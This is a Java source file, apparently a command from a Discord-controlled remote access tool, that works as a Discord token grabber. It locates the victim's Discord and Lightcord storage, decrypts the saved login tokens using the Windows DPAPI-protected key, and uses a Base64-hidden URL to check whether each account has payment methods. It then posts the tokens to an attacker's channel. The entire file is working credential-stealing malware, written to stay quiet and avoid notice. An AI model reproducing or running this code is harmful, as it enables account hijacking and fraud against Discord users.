package me.vasler.command.impl.token;

import com.eclipsesource.json.Json;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import me.vasler.command.Command;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class TokenCommand
        extends Command {
    protected List<String> tokens = new ArrayList<>();

    public TokenCommand() {
        super(new String[]{"token", "tokens", "discord"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        this.getTokens("discord");
        this.getTokens("discordcanary");
        this.getTokens("discordptb");
        this.getTokens("Lightcord");
        for (String token : this.tokens) {
            EmbedBuilder eb = new EmbedBuilder();
            eb.setTitle("Token Grabber", null);
            eb.setColor(Color.BLUE);
            // token
            eb.addField("Token", "```" + token + "```", false);
            // payment
            if (getPaymentMethods(token))
                eb.addField("Payment", "```" + "true" + "```", false);
            else
                eb.addField("Payment", "```" + "false" + "```", false);
            channel.sendMessageEmbeds(eb.build()).queue();
        }
    }

    public static boolean getPaymentMethods(String token)
    {
        try
        {
            URL url = new URL(new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2Vz"), StandardCharsets.UTF_8));
            HttpsURLConnection userConnection = (HttpsURLConnection)url.openConnection();

            userConnection.setRequestProperty("Authorization", token);
            userConnection.setRequestProperty("Content-Type", "application/json");
            userConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.0; en-US; rv:1.9.0.20) Gecko/20220510 Firefox/36.0");

            BufferedReader reader = new BufferedReader(new InputStreamReader(userConnection.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null)
                sb.append(line);

            reader.close();
            userConnection.disconnect();

            return sb.toString().length() > 2;
        }
        catch (Exception e)
        {
            // DUDE
        }

        return false;
    }

    private void getTokens(String channel) {
        Path data = Paths.get(System.getenv("APPDATA"), channel);
        Path localState = data.resolve("Local State");
        Path localStorage = data.resolve("Local Storage").resolve("leveldb");
        try {
            if (Files.exists(localState) && Files.exists(localStorage)) {
                byte[] encodedKey = Base64.getDecoder().decode(Json.parse(new InputStreamReader(Files.newInputStream(localState))).asObject().get("os_crypt").asObject().get("encrypted_key").asString());
                byte[] key = Arrays.copyOfRange(encodedKey, 5, encodedKey.length);
                Pattern pattern = Pattern.compile("dQw4w9WgXcQ:([^\"]*)\"");
                for (Path path : Files.walk(localStorage, new FileVisitOption[0]).filter(pathx -> pathx.getFileName().toString().endsWith(".ldb")).collect(Collectors.toList())) {
                    Matcher matcher = pattern.matcher(new String(Files.readAllBytes(path)));
                    while (matcher.find()) {
                        byte[] encryptedToken = Base64.getDecoder().decode(matcher.group(1));
                        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                        cipher.init(2, new SecretKeySpec(Crypt32Util.cryptUnprotectData(key), "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(encryptedToken, 3, 15)));
                        String token = new String(cipher.doFinal(Arrays.copyOfRange(encryptedToken, 15, encryptedToken.length)));
                        if (this.tokens.contains(token)) continue;
                        this.tokens.add(token);
                    }
                }
            }
        } catch (Exception exception) {
            // empty catch block
        }
    }

}

